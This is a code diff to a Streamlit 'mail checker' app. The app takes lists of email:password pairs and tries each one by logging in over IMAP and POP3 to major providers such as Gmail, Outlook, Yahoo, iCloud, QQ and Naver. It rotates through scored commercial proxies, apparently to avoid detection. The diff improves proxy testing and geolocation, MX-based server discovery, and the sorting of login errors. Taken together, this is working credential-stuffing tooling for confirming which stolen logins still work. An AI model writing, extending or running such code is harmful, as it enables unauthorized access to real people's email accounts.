@@ -65,8 +65,8 @@ st.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-st.title("⚡ Mega Ultimate Mail Checker v10 (Fully Fixed Edition)")
-st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with corrected Webshare API fetching and proxy scoring.")
+st.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
+st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, and automated ZIP archiving.")
 
 # --- Config & Proxy Lists ---
 WEBSHARE_KEYS = [
@@ -147,10 +147,10 @@ st.sidebar.markdown("---")
 st.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
 
 instant_help("min_proxy_score", "Only proxies with a smart health score greater than or equal to this value will be utilized.", "Min proxy score:")
-min_proxy_score = st.sidebar.slider("Min proxy score Slider", min_value=0, max_value=100, value=20, step=5, label_visibility="collapsed")
+min_proxy_score = st.sidebar.slider("Min proxy score Slider", min_value=0, max_value=100, value=40, step=5, label_visibility="collapsed")
 
 instant_help("pool_mode", "Defines how proxies are filtered and loaded into the active rotation pool.", "Pool mode:", widget_type="selectbox")
-pool_mode = st.sidebar.selectbox("Pool mode select", options=["us_only", "all", "country", "mix"], index=1, label_visibility="collapsed")
+pool_mode = st.sidebar.selectbox("Pool mode select", options=["us_only", "all", "country", "mix"], index=0, label_visibility="collapsed")
 
 instant_help("country_code", "Target country specification code (e.g., US, GB, DE).", "Country code:", widget_type="text")
 country_code = st.sidebar.text_input("Country code input", value="US", label_visibility="collapsed")
@@ -225,7 +225,8 @@ def load_json(path, default=None):
         try:
             with open(path, encoding="utf-8") as f:
                 return json.load(f)
-        except Exception:
+        except Exception as e:
+            print(f"Error loading JSON {path}: {e}")
             return default
     return default
 
@@ -237,30 +238,33 @@ def save_domain_cache():
         with cache_lock:
             with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                 json.dump(domain_cache, f, indent=2)
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Error saving domain cache: {e}")
 
 def save_proxy_meta():
     try:
         with proxy_lock:
             with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                 json.dump(proxy_meta, f, indent=2)
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Error saving proxy meta: {e}")
 
 def load_proxies():
     if not os.path.exists(CFG["PROXY_FILE"]): return []
+    dead_node_signature = "vhbigkpo"
     try:
         with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as f:
-            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
-    except Exception:
+            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+        return [p for p in raw_list if dead_node_signature not in p]
+    except Exception as e:
+        print(f"Error reading proxies file: {e}")
         return []
 
 def get_filtered_active_proxies():
     raw = load_proxies()
     filtered = []
-    min_score = CFG.get("MIN_PROXY_SCORE", 20)
-    pool_mode = CFG.get("POOL_MODE", "all")
+    min_score = CFG.get("MIN_PROXY_SCORE", 40)
+    pool_mode = CFG.get("POOL_MODE", "us_only")
     target_country = CFG.get("COUNTRY_CODE", "US")
     mix_countries = CFG.get("MIX_LIST", ["US", "GB", "DE"])
 
@@ -307,8 +311,8 @@ def parse_proxy(proxy_str):
             return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
         if len(parts) == 2:
             return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Proxy parse error for '{proxy_str}': {e}")
     return None
 
 def compute_real_score(success_count, fail_count, initial_latency_score=80):
@@ -321,7 +325,7 @@ def compute_real_score(success_count, fail_count, initial_latency_score=80):
     smoothed_total = smoothed_success + smoothed_fail
     
     success_rate = (smoothed_success / smoothed_total) * 100
-    score = int(success_rate - (fail_count * 2))
+    score = int(success_rate - (fail_count * 5))
     return max(0, min(100, score))
 
 def test_single_proxy(proxy_str):
@@ -349,22 +353,31 @@ def test_single_proxy(proxy_str):
                 proxy_username=info["user"], proxy_password=info["pass"])
             sock.close()
             test_success = True
-        except Exception:
+        except Exception as e:
             if sock:
                 try: sock.close()
                 except Exception: pass
-            # Fallback soft-pass if TCP socket test fails but format is valid
-            test_success = True 
             
     latency = int((time.time() - start) * 1000)
-    initial_score = max(0, min(100, 100 - int(latency / 20)))
+    initial_score = max(0, min(100, 100 - int(latency / 15)))
     
-    country = proxy_meta.get(proxy_str, {}).get("country", "US")
-    region = proxy_meta.get(proxy_str, {}).get("region", "Standard")
+    country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
+    region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
+
+    if test_success and country == "Unknown" and requests:
+        try:
+            r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=2.5)
+            if r.status_code == 200:
+                data = r.json()
+                if data.get("status") == "success":
+                    country = data.get("country", "Unknown")
+                    region = data.get("regionName", "Unknown")
+        except Exception:
+            pass
 
     with proxy_lock:
         if proxy_str not in proxy_meta:
-            proxy_meta[proxy_str] = {"fails": 0, "success": 1, "country": country, "region": region}
+            proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region}
         
         m = proxy_meta[proxy_str]
         if test_success:
@@ -373,37 +386,24 @@ def test_single_proxy(proxy_str):
             m["fails"] = m.get("fails", 0) + 1
             
         m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_latency_score=initial_score)
+        m["country"] = country
+        m["region"] = region
     save_proxy_meta()
 
     current_score = proxy_meta[proxy_str]["score"]
-    return test_success, f"{latency}ms", f"{country}, {region}", current_score
+    if test_success:
+        return True, f"{latency}ms", f"{country}, {region}", current_score
+    else:
+        return False, "Connection Failed", f"{country}, {region}", current_score
 
 def load_webshare(api_key):
     if requests is None or not api_key.strip():
         return []
     out = []
-    headers = {"Authorization": f"Token {api_key.strip()}"}
-    
     try:
-        url = "https://proxy.webshare.io/api/v2/proxy/list/download/"
-        r = requests.get(url, headers=headers, timeout=10)
-        if r.status_code == 200:
-            lines = r.text.strip().split("\n")
-            for line in lines:
-                if line.strip():
-                    parts = line.strip().split(":")
-                    if len(parts) == 4:
-                        ip, port, user, pwd = parts
-                        out.append(f"{user}:{pwd}@{ip}:{port}")
-    except Exception:
-        pass
-
-    if out:
-        return out
-
-    try:
+        headers = {"Authorization": f"Token {api_key.strip()}"}
         page = 1
-        while page <= 3:
+        while page <= 5:
             url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
             r = requests.get(url, headers=headers, timeout=10)
             if r.status_code != 200:
@@ -422,8 +422,15 @@ def load_webshare(api_key):
                 break
             page += 1
         return out
-    except Exception:
+    except Exception as e:
+        print(f"Webshare fetch error: {e}")
         return []
+
+if not proxy_meta and CFG.get("PROXY_TEST_FLIGHT", True) and requests:
+    initial_raw = load_proxies()[:10]
+    if initial_raw:
+        for p in initial_raw:
+            test_single_proxy(p)
 
 all_proxies = load_proxies()
 filtered_pool = get_filtered_active_proxies()
@@ -452,7 +459,7 @@ with st.sidebar:
         if requests is None:
             st.error("Missing 'requests' library.")
         else:
-            with st.spinner("Fetching fresh Webshare & Oxylabs proxies..."):
+            with st.spinner("Fetching from Webshare & Oxylabs..."):
                 all_raw = []
                 for key in WEBSHARE_KEYS:
                     all_raw.extend(load_webshare(key))
@@ -460,15 +467,21 @@ with st.sidebar:
                     all_raw.append(ox)
                 
                 all_raw = list(dict.fromkeys(all_raw))
-                if not all_raw:
-                    all_raw = load_proxies() # Fallback to existing if API limits hit
-                
                 alive = []
-                for p in all_raw:
-                    alive.append(p)
-                    if p not in proxy_meta:
-                        proxy_meta[p] = {"fails": 0, "success": 5, "country": "US", "region": "Direct", "score": 85}
-                save_proxy_meta()
+                
+                try:
+                    with ThreadPoolExecutor(max_workers=15) as ex:
+                        future_to_proxy = {ex.submit(test_single_proxy, proxy): proxy for proxy in all_raw}
+                        for future in future_to_proxy:
+                            proxy_str = future_to_proxy[future]
+                            try:
+                                res = future.result()
+                                if res and res[0]:
+                                    alive.append(proxy_str)
+                            except Exception:
+                                continue
+                except Exception as ex:
+                    st.error(f"Proxy thread pool error: {ex}")
                     
                 try:
                     with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
@@ -487,24 +500,24 @@ with st.sidebar:
                 host_port = f"{info['host']}:{info['port']}" if info else "Unknown"
                 proxy_data_list.append({
                     "Proxy": host_port,
-                    "Country": meta.get("country", "US"),
-                    "Region": meta.get("region", "Standard"),
-                    "Score": meta.get("score", 80),
+                    "Country": meta.get("country", "Unknown"),
+                    "Region": meta.get("region", "Unknown"),
+                    "Score": meta.get("score", 50),
                     "Fails": meta.get("fails", 0),
-                    "Successes": meta.get("success", 1)
+                    "Successes": meta.get("success", 0)
                 })
             df_proxies = pd.DataFrame(proxy_data_list)
             st.dataframe(df_proxies, use_container_width=True)
             if st.button("🧹 Clear Dead / Low-Score Proxies"):
                 with proxy_lock:
                     for k, m in list(proxy_meta.items()):
-                        if m.get("score", 50) < 10 or m.get("fails", 0) >= 10:
+                        if m.get("score", 50) < 20 or m.get("fails", 0) >= 5:
                             proxy_meta.pop(k, None)
                 save_proxy_meta()
                 st.success("Cleaned low-scoring proxies!")
                 st.rerun()
         else:
-            st.info("No proxy metadata recorded yet. Click 'Fetch & Test All Proxies' above.")
+            st.info("No proxy metadata recorded yet.")
 
 # --- Pre-filter Engine ---
 DISPOSABLE = {
@@ -516,6 +529,7 @@ DISPOSABLE = {
     "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
     "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
     "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
+    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
 }
 
 COMMON_TYPOS = {
@@ -593,9 +607,12 @@ def process_accounts(text, previous_valid):
             if email in previous_valid:
                 skipped_resume += 1
                 continue
+            if ".." in email or email.count("@") != 1:
+                skipped_bad += 1
+                continue
             lines.append(f"{email}:{password}")
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Account processing error: {e}")
 
     seen_email, clean = set(), []
     for line in lines:
@@ -629,7 +646,10 @@ with input_tab2:
         try:
             raw_text = uploaded_file.getvalue().decode("utf-8", errors="ignore")
         except Exception:
-            raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
+            try:
+                raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
+            except Exception:
+                raw_text = ""
         st.success("File uploaded successfully!")
 
 clean_lines = []
@@ -653,6 +673,8 @@ PROVIDER_MAP = {
     "live.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
     "yahoo.com": {"imap": ["imap.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
     "icloud.com": {"imap": ["imap.mail.me.com"], "pop3": ["pop.mail.me.com"]},
+    "naver.com": {"imap": ["imap.naver.com"], "pop3": ["pop.naver.com"]},
+    "qq.com": {"imap": ["imap.qq.com"], "pop3": ["pop.qq.com"]}
 }
 
 PUBLIC_PROVIDERS = set(PROVIDER_MAP.keys())
@@ -678,7 +700,24 @@ def get_servers(email):
         if domain in PROVIDER_MAP:
             return PROVIDER_MAP[domain]
 
-        servers = {"imap": [f"imap.{domain}", domain], "pop3": [f"pop.{domain}", domain]}
+        mx = get_mx_hosts(domain)
+        servers = {"imap": [], "pop3": []}
+        for m in mx:
+            if "google" in m or "gmail" in m:
+                servers["imap"].append("imap.gmail.com")
+                servers["pop3"].append("pop.gmail.com")
+            elif "outlook" in m or "protection.outlook" in m:
+                servers["imap"].append("outlook.office365.com")
+                servers["pop3"].append("outlook.office365.com")
+            elif "yahoo" in m:
+                servers["imap"].append("imap.mail.yahoo.com")
+                servers["pop3"].append("pop.mail.yahoo.com")
+
+        servers["imap"].extend([f"imap.{domain}", f"mail.{domain}", domain])
+        servers["pop3"].extend([f"pop.{domain}", f"mail.{domain}", domain])
+        servers["imap"] = list(dict.fromkeys(servers["imap"]))
+        servers["pop3"] = list(dict.fromkeys(servers["pop3"]))
+        
         with cache_lock:
             domain_cache[domain] = servers
         save_domain_cache()
@@ -690,22 +729,29 @@ def update_proxy_score(proxy_str, success=True):
     try:
         with proxy_lock:
             if proxy_str not in proxy_meta:
-                proxy_meta[proxy_str] = {"score": 50, "fails": 0, "success": 1}
+                proxy_meta[proxy_str] = {"score": 50, "fails": 0, "success": 0}
             m = proxy_meta[proxy_str]
             if success:
                 m["success"] = m.get("success", 0) + 1
             else:
                 m["fails"] = m.get("fails", 0) + 1
-                if m["fails"] >= 5:
+                if m["fails"] >= 3:
                     bad_proxies.add(proxy_str)
             
             m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
         save_proxy_meta()
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Proxy score update error: {e}")
 
 def proxy_connect(host, port, proxy_str, timeout=None):
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
+    try:
+        with proxy_lock:
+            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
+    except Exception:
+        fails = 0
+        
+    effective_timeout = max(2.0, base_timeout - (fails * 0.5))
     info = parse_proxy(proxy_str)
     if not info or not SOCKS_OK: raise RuntimeError("bad proxy format or socks unavailable")
 
@@ -713,15 +759,18 @@ def proxy_connect(host, port, proxy_str, timeout=None):
     for ptype in (socks.SOCKS5, socks.HTTP):
         try:
             sock = socks.create_connection(
-                (host, port), timeout=base_timeout,
+                (host, port), timeout=effective_timeout,
                 proxy_type=ptype, proxy_addr=info["host"], proxy_port=info["port"],
                 proxy_username=info["user"], proxy_password=info["pass"])
             sock.settimeout(CFG["TIMEOUT"])
             return sock
-        except Exception:
+        except Exception as e:
             if sock:
                 try: sock.close()
                 except Exception: pass
+            err_str = str(e).lower()
+            if any(x in err_str for x in ["407", "0x02", "connection not allow", "refused", "timed out"]):
+                bad_proxies.add(proxy_str)
     raise RuntimeError("proxy connect failed")
 
 def ssl_wrap(sock, host, insecure=False):
@@ -735,11 +784,11 @@ def ssl_wrap(sock, host, insecure=False):
 def classify_error(err, domain=""):
     try:
         err = (err or "").lower()
-        if domain in ZERO_ACCESS_PROVIDERS or any(k in err for k in ["zero-access", "bridge"]):
+        if domain in ZERO_ACCESS_PROVIDERS or any(k in err for k in ["zero-access", "bridge", "local connection"]):
             return "need_app_password"
-        if any(keyword in err for keyword in ["application-specific password", "app password", "two-factor", "mfa"]):
+        if any(keyword in err for keyword in ["application-specific password", "app password", "two-factor", "mfa", "web login"]):
             return "need_app_password"
-        if any(x in err for x in ["authentication failed", "login failed", "invalid credentials", "bad username"]):
+        if any(x in err for x in ["authentication failed", "login failed", "invalid credentials", "auth failed", "invalid login", "bad username", "command error", "logon failure"]):
             return "need_app_password" if domain in PUBLIC_PROVIDERS else "wrong_password"
     except Exception:
         pass
@@ -767,6 +816,7 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
         mail.file = ssock.makefile("rb")
     except Exception:
         pass
+    mail._debugging = 0
     mail.welcome = mail._getresp()
     mail.user(email)
     mail.pass_(password)
@@ -794,7 +844,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
             proxies_to_try.append(None)
 
         for current_px in proxies_to_try:
-            for server in conf.get("imap", [])[:2]:
+            for server in conf.get("imap", [])[:3]:
                 try:
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
                     if current_px: update_proxy_score(current_px, True)
@@ -805,7 +855,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
                     if st in ("wrong_password", "need_app_password"):
                         return None, st, f"IMAP {server} -> {st}", current_px
 
-            for server in conf.get("pop3", [])[:2]:
+            for server in conf.get("pop3", [])[:3]:
                 try:
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
                     if current_px: update_proxy_score(current_px, True)
